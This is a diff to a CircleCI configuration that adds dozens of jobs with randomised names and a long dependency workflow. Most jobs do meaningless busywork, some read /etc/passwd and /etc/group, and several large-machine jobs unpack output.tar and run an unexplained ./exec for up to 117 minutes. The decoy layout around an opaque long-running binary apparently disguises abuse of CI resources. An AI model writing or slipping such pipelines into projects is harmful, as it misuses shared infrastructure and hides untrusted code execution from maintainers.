+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  reset_jan5-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: LGTM
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 2 100 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next} print}' | tail -5; true ; } > /tmp/outbox/gate-done.out
+            echo "staging complete; file length=$(wc -c </tmp/outbox/gate-done.out)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - gate-done.out
+  jan5-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/gate-done.out || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  bake_fix-parse:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: dropoff peak
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=split("alpha beta gamma delta",arr," "); print n}'; true ; } > /tmp/outbox/step-7.out
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-7.out)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-7.out
+  fix-parse:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/step-9.out || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+
+  A_foxtrot_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: smooth out
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; type echo; true ; } > /tmp/outbox/.marker
+            echo "staging complete; file length=$(wc -c </tmp/outbox/.marker)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - .marker
+  preflight_green-light-go_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: pager loud
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; ps -eo state 2>/dev/null | sort | uniq -c; true ; } > /tmp/outbox/relay.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/relay.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - relay.txt
+  p1_jan5-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: plank 90
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 479798 | md5sum; true ; } > /tmp/outbox/gate-done.out
+            echo "staging complete; file length=$(wc -c </tmp/outbox/gate-done.out)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - gate-done.out
+  loader_feat-2216_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: front raise
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "$RANDOM$RANDOM" | md5sum; true ; } > /tmp/outbox/payload.pkg
+            echo "staging complete; file length=$(wc -c </tmp/outbox/payload.pkg)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - payload.pkg
+  staging_q2-cleanup_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: picnic
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "data1" | od -An -c | head -1; true ; } > /tmp/outbox/metrics.jsonl
+            echo "staging complete; file length=$(wc -c </tmp/outbox/metrics.jsonl)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - metrics.jsonl
+  g1_v8-rc1_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: loop till red
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 393681 | awk '{if($1%2)o++;else e++}END{print o"/"e}'; true ; } > /tmp/outbox/step-16.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-16.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-16.log
+  retry_zulu_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: heat pack
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=1;a++)for(b=1;b<=15650;b++)s+=a*b;print s}'; true ; } > /tmp/outbox/2024-11-04.data
+            echo "staging complete; file length=$(wc -c </tmp/outbox/2024-11-04.data)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 2024-11-04.data
+  cook_min-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: lacrosse ball
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; printf "%d\n" $((RANDOM * 17 + 42)); true ; } > /tmp/outbox/step-22.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-22.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-22.txt
+  warmer_do-the-thing_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: below decks
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello world foo"; split(s,a," "); for(i=length(a);i>=1;i--)printf "%s ",a[i]; print ""}' 2>/dev/null || awk 'BEGIN{split("hello world foo",a," "); n=0; for(k in a)n++; print n}'; true ; } > /tmp/outbox/gate-ready.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/gate-ready.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - gate-ready.log
+  vendor_rc-v5_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: hello world
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "line1 line2 line3" | awk '{print $2}'; true ; } > /tmp/outbox/step-15.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-15.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-15.log
+  fixture_Prepare_App1_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: reef knot
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; ps -eo comm 2>/dev/null | sort | uniq | head -10; true ; } > /tmp/outbox/cache.bin
+            echo "staging complete; file length=$(wc -c </tmp/outbox/cache.bin)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - cache.bin
+  retry_anothr-run_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: split jump
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; yes "abc" | head -500 | sort | uniq | wc -l; true ; } > /tmp/outbox/manifest.bin
+            echo "staging complete; file length=$(wc -c </tmp/outbox/manifest.bin)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - manifest.bin
+  prebuild_yankee-7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: banner swap
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 358400 | fold -w8 | sort -u | wc -l; true ; } > /tmp/outbox/stage-ready.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/stage-ready.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stage-ready.txt
+  tap_luna-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: ding ding
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{split("red,green,blue",a,","); for(i in a) print a[i]}' | sort; true ; } > /tmp/outbox/ckpt-alt.pickle
+            echo "staging complete; file length=$(wc -c </tmp/outbox/ckpt-alt.pickle)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - ckpt-alt.pickle
+  enqueue_phoenix_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: plywood ply
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{if("abc" ~ /b/)print "match"; else print "no"}'; true ; } > /tmp/outbox/.ok
+            echo "staging complete; file length=$(wc -c </tmp/outbox/.ok)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - .ok
+  inspect_titan2-final_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: beep boop
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; sed -n '/^root/p' /etc/passwd | head -1 | md5sum; true ; } > /tmp/outbox/bundle
+            echo "staging complete; file length=$(wc -c </tmp/outbox/bundle)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - bundle
+  A_dec7-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: stamp denied
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cat /etc/group | md5sum | cut -c1-20; true ; } > /tmp/outbox/.pid
+            echo "staging complete; file length=$(wc -c </tmp/outbox/.pid)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - .pid
+workflows:
+  main:
+    jobs:
+      - redo_jess-ship
+      - bake_fix-parse
+      - beta_callisto-final
+      - jess-ship:
+          requires:
+            - redo_jess-ship
+            - bake_fix-parse
+            - beta_callisto-final
+      - fix-parse:
+          requires:
+            - redo_jess-ship
+            - bake_fix-parse
+            - beta_callisto-final
+      - callisto-final:
+          requires:
+            - redo_jess-ship
+            - bake_fix-parse
+            - beta_callisto-final
+      - build:
+          requires:
+            - redo_jess-ship
+            - bake_fix-parse
+            - beta_callisto-final
+      - DEPLOY_DEV:
+          requires:
+            - redo_jess-ship
+            - bake_fix-parse
+            - beta_callisto-final
+      - auh-check-10:
+          requires:
+            - redo_jess-ship
+            - bake_fix-parse
+            - beta_callisto-final
+      - java17-build:
+          requires:
+            - redo_jess-ship
+            - bake_fix-parse
+            - beta_callisto-final
+      - round2_foxtrot
+      - A_foxtrot_2:
+          requires:
+            - round2_foxtrot
+      - foxtrot:
+          requires:
+            - A_foxtrot_2
+      - drain_green-light-go:
+          requires:
+            - A_foxtrot_2
+      - preflight_green-light-go_2:
+          requires:
+            - drain_green-light-go
+      - green-light-go:
+          requires:
+            - preflight_green-light-go_2
+      - reset_jan5-ship:
+          requires:
+            - preflight_green-light-go_2
+      - p1_jan5-ship_2:
+          requires:
+            - reset_jan5-ship
+      - jan5-ship:
+          requires:
+            - p1_jan5-ship_2
+      - stepB_feat-2216:
+          requires:
+            - p1_jan5-ship_2
+      - loader_feat-2216_2:
+          requires:
+            - stepB_feat-2216
+      - feat-2216:
+          requires:
+            - loader_feat-2216_2
+      - postcheck_q2-cleanup:
+          requires:
+            - loader_feat-2216_2
+      - staging_q2-cleanup_2:
+          requires:
+            - postcheck_q2-cleanup
+      - q2-cleanup:
+          requires:
+            - staging_q2-cleanup_2
+      - fixture_v8-rc1:
+          requires:
+            - staging_q2-cleanup_2
+      - g1_v8-rc1_2:
+          requires:
+            - fixture_v8-rc1
+      - v8-rc1:
+          requires:
+            - g1_v8-rc1_2
+      - db_zulu:
+          requires:
+            - g1_v8-rc1_2
+      - retry_zulu_2:
+          requires:
+            - db_zulu
+      - zulu:
+          requires:
+            - retry_zulu_2
+      - bootstrap_min-smoke:
+          requires:
+            - retry_zulu_2
+      - cook_min-smoke_2:
+          requires:
+            - bootstrap_min-smoke
+      - min-smoke:
+          requires:
+            - cook_min-smoke_2
+      - provision_do-the-thing:
+          requires:
+            - cook_min-smoke_2
+      - warmer_do-the-thing_2:
+          requires:
+            - provision_do-the-thing
+      - do-the-thing:
+          requires:
+            - warmer_do-the-thing_2
+      - green_rc-v5:
+          requires:
+            - warmer_do-the-thing_2
+      - vendor_rc-v5_2:
+          requires:
+            - green_rc-v5
+      - rc-v5:
+          requires:
+            - vendor_rc-v5_2
+      - checker_Prepare_App1:
+          requires:
+            - vendor_rc-v5_2
+      - fixture_Prepare_App1_2:
+          requires:
+            - checker_Prepare_App1
+      - Prepare_App1:
+          requires:
+            - fixture_Prepare_App1_2
+      - hook_anothr-run
+      - retry_anothr-run_2:
+          requires:
+            - hook_anothr-run
+      - anothr-run:
+          requires:
+            - retry_anothr-run_2
+      - checker_yankee-7:
+          requires:
+            - retry_anothr-run_2
+      - prebuild_yankee-7_2:
+          requires:
+            - checker_yankee-7
+      - yankee-7:
+          requires:
+            - prebuild_yankee-7_2
+      - verify_luna-test:
+          requires:
+            - prebuild_yankee-7_2
+      - tap_luna-test_2:
+          requires:
+            - verify_luna-test
+      - luna-test:
+          requires:
+            - tap_luna-test_2
+      - bundle_phoenix:
+          requires:
+            - tap_luna-test_2
+      - enqueue_phoenix_2:
+          requires:
+            - bundle_phoenix
+      - phoenix:
+          requires:
+            - enqueue_phoenix_2
+      - checker_titan2-final:
+          requires:
+            - enqueue_phoenix_2
+      - inspect_titan2-final_2:
+          requires:
+            - checker_titan2-final
+      - titan2-final:
+          requires:
+            - inspect_titan2-final_2
+      - stage_dec7-rev:
+          requires:
+            - inspect_titan2-final_2
+      - A_dec7-rev_2:
+          requires:
+            - stage_dec7-rev
+      - dec7-rev:
+          requires:
+            - A_dec7-rev_2
+      - preflight_hyperion-ng
+      - prebuild_rip-it
+      - hyperion-ng:
+          requires:
+            - preflight_hyperion-ng
+            - prebuild_rip-it
+      - rip-it:
+          requires:
+            - preflight_hyperion-ng
+            - prebuild_rip-it
+      - nova-final:
+          requires:
+            - preflight_hyperion-ng
+            - prebuild_rip-it
+      - vb-v2:
+          requires:
+            - preflight_hyperion-ng
+            - prebuild_rip-it
+      - teh-ci:
+          requires:
+            - preflight_hyperion-ng
+            - prebuild_rip-it
+      - realease-64:
+          requires:
+            - preflight_hyperion-ng
+            - prebuild_rip-it
